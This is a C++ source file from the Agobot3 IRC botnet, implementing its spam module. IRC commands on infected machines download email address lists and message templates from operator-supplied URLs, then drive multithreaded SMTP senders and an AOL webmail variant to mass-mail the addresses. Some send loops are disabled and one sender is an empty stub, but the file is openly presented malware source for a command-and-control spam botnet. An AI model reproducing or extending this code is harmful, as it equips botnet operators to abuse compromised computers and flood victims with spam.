/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2003 Ago
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#include "main.h"
#include "mainctrl.h"
#include "smtp_logic.h"
#include "smtp.h"

CSMTP_Logic::CSMTP_Logic() {
	m_szType="CSMTP_Logic";
	m_lEmails.clear(); m_sEmailTemplate.Assign(""); m_bSpamming=false; m_bTemplateSet=false;
}

CSMTP_Logic::~CSMTP_Logic() {
	m_lEmails.clear(); m_sEmailTemplate.Assign(""); m_bSpamming=false; m_bTemplateSet=false;
}

void CSMTP_Logic::Init() {
	REGCMD(m_cmdSetList,		"spam.setlist",		"downloads an email list",		false,	this);
	REGCMD(m_cmdSetTemplate,	"spam.settemplate",	"downloads an email template",	false,	this);
	REGCMD(m_cmdStart,			"spam.start",		"starts the spamming",			false,	this);
	REGCMD(m_cmdStop,			"spam.stop",		"stops the spamming",			false,	this);

	REGCVAR(spam_maxthreads,	"8",	"Spam Logic - Number of threads",	false,	0);
	REGCVAR(spam_htmlemail,		"true",	"Spam Logic - Send HTML emails",	false,	0);
}

bool CSMTP_Logic::HandleCommand(CMessage *pMsg) {
	if(!pMsg->sCmd.Compare("spam.setlist")) {
		m_sListURL.Assign(pMsg->sChatString.Token(1, " ")); 
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Downloading new email list.", pMsg->sReplyTo.Str());
		SetList(m_sListURL);
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Finished downloading new email list.", pMsg->sReplyTo.Str());
		return true; }

	else if(!pMsg->sCmd.Compare("spam.settemplate")) {	
		m_sTemplateURL.Assign(pMsg->sChatString.Token(1, " "));
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Downloading new email template.", pMsg->sReplyTo.Str());
		SetTemplate(m_sTemplateURL);
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Finished downloading new email template.", pMsg->sReplyTo.Str());
		return true; }

	else if(!pMsg->sCmd.Compare("spam.start")) {	
		m_bSpamming=true;
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Started spamming.", pMsg->sReplyTo.Str());
		return true; }

	else if(!pMsg->sCmd.Compare("spam.stop")) {	
		m_bSpamming=false;
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Stopped spamming.", pMsg->sReplyTo.Str());
		return true; }

	return false;
}

void CSMTP_Logic::SetList(CString &sURL) {
	try {
		url uURL;

		CDownloadHelper *pDldHlp=new CDownloadHelper;
		if(!ParseURL(sURL, &uURL)) return;

		pDldHlp->m_sHost.Assign(uURL.sHost); pDldHlp->m_sPath.Assign(uURL.sReq);
		pDldHlp->m_sTarget.Assign("list.tmp"); pDldHlp->m_sReplyTo.Assign("");
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=true; pDldHlp->m_bNotice=false; pDldHlp->m_bJoin=false;

		pDldHlp->Run(); delete pDldHlp;

		FILE *fp=fopen("list.tmp", "rb");
		if(!fp) return;
		int iFileSize=GetFileSize(fp);
		char *szList=new char[iFileSize+1];
		memset(szList, 0, iFileSize+1);
		fread(szList, sizeof(char), iFileSize, fp);
		CString sList(szList); char *szListCopy=sList.Str(), *szTemp;
		while(true) {
			char *szCRLF=strstr(szListCopy, "\r");
			if(!szCRLF) szCRLF=strstr(szListCopy, "\n");
			if(!szCRLF) break;
			while(*szCRLF=='\r') { *szCRLF='\0'; szCRLF++; }
			while(*szCRLF=='\n') { *szCRLF='\0'; szCRLF++; }
			while(*szCRLF=='\r') { *szCRLF='\0'; szCRLF++; }
			char *szToken=szListCopy; szListCopy=szCRLF;
			if(!strcmp(szToken, "")) continue;
			m_lEmails.push_back(CString(szToken)); }

		delete [] szList; fclose(fp);
		DeleteFile("list.tmp");
#ifdef PtW32CatchAll
	} PtW32CatchAll {
#else
	} catch(...) {
#endif
		// Bla
	}
}

void CSMTP_Logic::SetTemplate(CString &sURL) {
	try {
		url uURL;

		CDownloadHelper *pDldHlp=new CDownloadHelper;
		if(!ParseURL(sURL, &uURL)) return;

		pDldHlp->m_sHost.Assign(uURL.sHost); pDldHlp->m_sPath.Assign(uURL.sReq);
		pDldHlp->m_sTarget.Assign("template.tmp"); pDldHlp->m_sReplyTo.Assign("");
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=true; pDldHlp->m_bNotice=false; pDldHlp->m_bJoin=false;

		pDldHlp->Run(); delete pDldHlp;

		FILE *fp=fopen("template.tmp", "rb");
		if(!fp) return;
		int iFileSize=GetFileSize(fp);
		char *szTemplate=new char[iFileSize+1];
		memset(szTemplate, 0, iFileSize+1);

		while(!feof(fp)) {
			fgets(szTemplate, iFileSize, fp);
			CString sTemplate(szTemplate);
			if(sTemplate.Find('\r', 0)) {
				sTemplate[sTemplate.Find('\r', 0)-1]='\0';
			}
			if(sTemplate.Find('\n', 0)) {
				sTemplate[sTemplate.Find('\n', 0)-1]='\0';
			}

			if(!sTemplate.Mid(0, 4).Compare("data")) break;

			if(!sTemplate.Token(0, " ").Compare("from")) {
				m_sEmailSrc.Assign(sTemplate.Token(1, " ", true));
			}

			if(!sTemplate.Token(0, " ").Compare("from_full")) {
				m_sEmailSrcFull.Assign(sTemplate.Token(1, " ", true));
			}

			if(!sTemplate.Token(0, " ").Compare("subject")) {
				m_sSubject.Assign(sTemplate.Token(1, " ", true));
			}
		}

		CString sDataTmp("");

		while(!feof(fp)) {
			fgets(szTemplate, iFileSize, fp);
			CString sTemplate(szTemplate);
			if(sTemplate.Find('\r', 0)) {
				sTemplate[sTemplate.Find('\r', 0)-1]='\0';
			}
			if(sTemplate.Find('\n', 0)) {
				sTemplate[sTemplate.Find('\n', 0)-1]='\0';
			}

			sDataTmp.Append(sTemplate); sDataTmp.Append("\r\n");
		}

		m_sData.Assign(sDataTmp);
		m_sEmailTemplate.Assign("");
		delete [] szTemplate; fclose(fp);
		DeleteFile("template.tmp");

		m_bTemplateSet=true;
#ifdef PtW32CatchAll
		} PtW32CatchAll {
#else
		} catch(...) {
#endif
		// Bla
	}
}

void *CSMTP_Logic::Run() {
	return NULL;
	while(true) {
		try {
			int iNumThreads=spam_maxthreads.iValue;
			CSMTP_Sender *pSenders=new CSMTP_Sender[iNumThreads];

			// Spam loop
			while(m_bSpamming && m_bTemplateSet) {
				// Loop through all available threads
				for(int i=0; i<iNumThreads; i++) {
					if(!m_bSpamming || !m_bTemplateSet) break;
					if(!pSenders[i].m_bFinished) continue;

					// If there are no more addresses, download new ones
					while(m_lEmails.size()<1) {
						SetList(m_sListURL); Sleep(1000); }

					// Get the values
					CString sEmailSrc=m_sEmailSrc;
					CString sEmailSrcFull=m_sEmailSrcFull;
					CString sEmailAddress=m_lEmails.front(); m_lEmails.pop_front();
					CString sSubject=m_sSubject;
					CString sData=m_sData;
					CString sSMTPHost=sEmailAddress.Token(1, "@");

					// Resolve the MX
					CDNS cDNS; CString sDNS=cDNS.ResolveMX(sSMTPHost.CStr());
					// Fall back to A record in case this failed
					if(!sDNS.Compare("")) sDNS.Assign(sSMTPHost);

					if(pSenders[i].m_bFinished) {
						pSenders[i].SetMail(sEmailSrc, sEmailSrcFull, sEmailAddress, sSubject, sData);
						pSenders[i].SetServer(sDNS, 25); pSenders[i].Start(false);
					}
				}
			}

			delete [] pSenders; Sleep(2000);
#ifdef PtW32CatchAll
		} PtW32CatchAll {
#else
		} catch(...) {
#endif
			// Bla
		}
	}

	return NULL;
}

CAOL_Logic::CAOL_Logic() {
	m_szType="CAOL_Logic";
	m_lEmails.clear(); m_sEmailTemplate.Assign(""); m_bSpamming=false; m_bTemplateSet=false;
}

CAOL_Logic::~CAOL_Logic() {
	m_lEmails.clear(); m_sEmailTemplate.Assign(""); m_bSpamming=false; m_bTemplateSet=false;
}

void CAOL_Logic::Init() {
	REGCMD(m_cmdSetList,		"aolspam.setlist",		"aol - downloads an email list",		false,	this);
	REGCMD(m_cmdSetTemplate,	"aolspam.settemplate",	"aol - downloads an email template",	false,	this);
	REGCMD(m_cmdSetUser,		"aolspam.setuser",		"aol - sets an username",				false,	this);
	REGCMD(m_cmdSetPass,		"aolspam.setpass",		"aol - sets a password",				false,	this);
	REGCMD(m_cmdStart,			"aolspam.start",		"aol - starts the spamming",			false,	this);
	REGCMD(m_cmdStop,			"aolspam.stop",			"aol - stops the spamming",				false,	this);

	REGCVAR(aolspam_maxthreads,	"8",	"AOL Spam Logic - Number of threads",	false,	0);
}

bool CAOL_Logic::HandleCommand(CMessage *pMsg) {
	if(!pMsg->sCmd.Compare("aolspam.setlist")) {
		m_sListURL.Assign(pMsg->sChatString.Token(1, " ")); 
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Downloading new email list.", pMsg->sReplyTo.Str());
		SetList(m_sListURL);
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Finished downloading new email list.", pMsg->sReplyTo.Str());
		return true; }

	else if(!pMsg->sCmd.Compare("aolspam.settemplate")) {	
		m_sTemplateURL.Assign(pMsg->sChatString.Token(1, " "));
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Downloading new email template.", pMsg->sReplyTo.Str());
		SetTemplate(m_sTemplateURL);
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Finished downloading new email template.", pMsg->sReplyTo.Str());
		return true; }

	if(!pMsg->sCmd.Compare("aolspam.setuser")) {
		SetUser(pMsg->sChatString.Token(1, " "));
		return true; }

	else if(!pMsg->sCmd.Compare("aolspam.setpass")) {	
		SetPassword(pMsg->sChatString.Token(1, " "));
		return true; }

	else if(!pMsg->sCmd.Compare("aolspam.start")) {	
		m_bSpamming=true;
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Started spamming.", pMsg->sReplyTo.Str());
		return true; }

	else if(!pMsg->sCmd.Compare("aolspam.stop")) {	
		m_bSpamming=false;
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				"Stopped spamming.", pMsg->sReplyTo.Str());
		return true; }

	return false;
}

void CAOL_Logic::SetList(CString &sURL) {
	try {
		url uURL;

		CDownloadHelper *pDldHlp=new CDownloadHelper;
		if(!ParseURL(sURL, &uURL)) return;

		pDldHlp->m_sHost.Assign(uURL.sHost); pDldHlp->m_sPath.Assign(uURL.sReq);
		pDldHlp->m_sTarget.Assign("list.tmp"); pDldHlp->m_sReplyTo.Assign("");
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=true; pDldHlp->m_bNotice=false; pDldHlp->m_bJoin=false;

		pDldHlp->Run(); delete pDldHlp;

		FILE *fp=fopen("list.tmp", "rb");
		if(!fp) return;
		int iFileSize=GetFileSize(fp);
		char *szList=new char[iFileSize+1];
		memset(szList, 0, iFileSize+1);
		fread(szList, sizeof(char), iFileSize, fp);
		CString sList(szList); char *szListCopy=sList.Str(), *szTemp;
		while(true) {
			char *szCRLF=strstr(szListCopy, "\r");
			if(!szCRLF) szCRLF=strstr(szListCopy, "\n");
			if(!szCRLF) break;
			while(*szCRLF=='\r') { *szCRLF='\0'; szCRLF++; }
			while(*szCRLF=='\n') { *szCRLF='\0'; szCRLF++; }
			while(*szCRLF=='\r') { *szCRLF='\0'; szCRLF++; }
			char *szToken=szListCopy; szListCopy=szCRLF;
			if(!strcmp(szToken, "")) continue;
			m_lEmails.push_back(CString(szToken)); }

		delete [] szList; fclose(fp);
		DeleteFile("list.tmp");
#ifdef PtW32CatchAll
		} PtW32CatchAll {
#else
		} catch(...) {
#endif
		// Bla
	}
}

void CAOL_Logic::SetTemplate(CString &sURL) {
	try {
		url uURL;

		CDownloadHelper *pDldHlp=new CDownloadHelper;
		if(!ParseURL(sURL, &uURL)) return;

		pDldHlp->m_sHost.Assign(uURL.sHost); pDldHlp->m_sPath.Assign(uURL.sReq);
		pDldHlp->m_sTarget.Assign("template.tmp"); pDldHlp->m_sReplyTo.Assign("");
		pDldHlp->m_bExecute=false; pDldHlp->m_bUpdate=false; pDldHlp->m_bFTP=false;
		pDldHlp->m_bSilent=true; pDldHlp->m_bNotice=false; pDldHlp->m_bJoin=false;

		pDldHlp->Run(); delete pDldHlp;

		FILE *fp=fopen("template.tmp", "rb");
		if(!fp) return;
		int iFileSize=GetFileSize(fp);
		char *szTemplate=new char[iFileSize+1];
		memset(szTemplate, 0, iFileSize+1);

		while(!feof(fp)) {
			fgets(szTemplate, iFileSize, fp);
			CString sTemplate(szTemplate);
			if(sTemplate.Find('\r', 0)) {
				sTemplate[sTemplate.Find('\r', 0)-1]='\0';
			}
			if(sTemplate.Find('\n', 0)) {
				sTemplate[sTemplate.Find('\n', 0)-1]='\0';
			}

			if(!sTemplate.Mid(0, 4).Compare("data")) break;

			if(!sTemplate.Token(0, " ").Compare("from")) {
				m_sEmailSrc.Assign(sTemplate.Token(1, " ", true));
			}

			if(!sTemplate.Token(0, " ").Compare("from_full")) {
				m_sEmailSrcFull.Assign(sTemplate.Token(1, " ", true));
			}

			if(!sTemplate.Token(0, " ").Compare("subject")) {
				m_sSubject.Assign(sTemplate.Token(1, " ", true));
			}
		}

		CString sDataTmp("");

		while(!feof(fp)) {
			fgets(szTemplate, iFileSize, fp);
			CString sTemplate(szTemplate);
			if(sTemplate.Find('\r', 0)) {
				sTemplate[sTemplate.Find('\r', 0)-1]='\0';
			}
			if(sTemplate.Find('\n', 0)) {
				sTemplate[sTemplate.Find('\n', 0)-1]='\0';
			}

			sDataTmp.Append(sTemplate); sDataTmp.Append("\r\n");
		}

		m_sData.Assign(sDataTmp);
		m_sEmailTemplate.Assign("");
		delete [] szTemplate; fclose(fp);
		DeleteFile("template.tmp");

		m_bTemplateSet=true;
#ifdef PtW32CatchAll
		} PtW32CatchAll {
#else
		} catch(...) {
#endif
		// Bla
	}
}

void CAOL_Logic::SetUser(CString &sUser) {
	m_sUser.Assign(sUser);
}

void CAOL_Logic::SetPassword(CString &sPass) {
	m_sPass.Assign(sPass);
}

void *CAOL_Logic::Run() {
	return NULL;
	while(true) {
		try {
			int iNumThreads=aolspam_maxthreads.iValue;
			CAOLWebMail *pSenders=new CAOLWebMail[iNumThreads];

			// Spam loop
			while(m_bSpamming && m_bTemplateSet) {
				// Loop through all available threads
				for(int i=0; i<iNumThreads; i++) {
					if(!m_bSpamming || !m_bTemplateSet) break;
					if(!pSenders[i].m_bFinished) continue;

					// If there are no more addresses, download new ones
					while(m_lEmails.size()<1) {
						SetList(m_sListURL); Sleep(1000); }

					// Get the values
					CString sEmailSrc=m_sEmailSrc;
					CString sEmailSrcFull=m_sEmailSrcFull;
					CString sEmailAddress=m_lEmails.front(); m_lEmails.pop_front();
					CString sSubject=m_sSubject;
					CString sData=m_sData;


					pSenders[i].SetMail(sEmailSrc, sEmailSrcFull, sEmailAddress, sSubject, sData);
					pSenders[i].Start(false);
				}
			}

			delete [] pSenders; Sleep(2000);
#ifdef PtW32CatchAll
		} PtW32CatchAll {
#else
		} catch(...) {
#endif
			// Bla
		}
	}

	return NULL;
}

CAOLWebMail::CAOLWebMail() { m_szType="CAOLWebMail"; m_bMailSet=false; m_bFinished=true; }
CAOLWebMail::~CAOLWebMail() { m_bMailSet=false; m_bFinished=true; }

void *CAOLWebMail::Run() {
	m_bFinished=false;

	while(!m_bMailSet) Sleep(1000);

	Send();

	m_bFinished=true;
	return NULL;
}

void CAOLWebMail::SetMail(CString sMailFrom, CString sMailFromFull, \
						  CString sRcptTo, CString sSubject, \
						  CString sData) {
	m_sMailFrom=sMailFrom; m_sMailFromFull=sMailFromFull;
	m_sRcptTo=sRcptTo; m_sSubject=sSubject; m_sData=sData;
	m_bMailSet=true;
}

void CAOLWebMail::Send() {
}
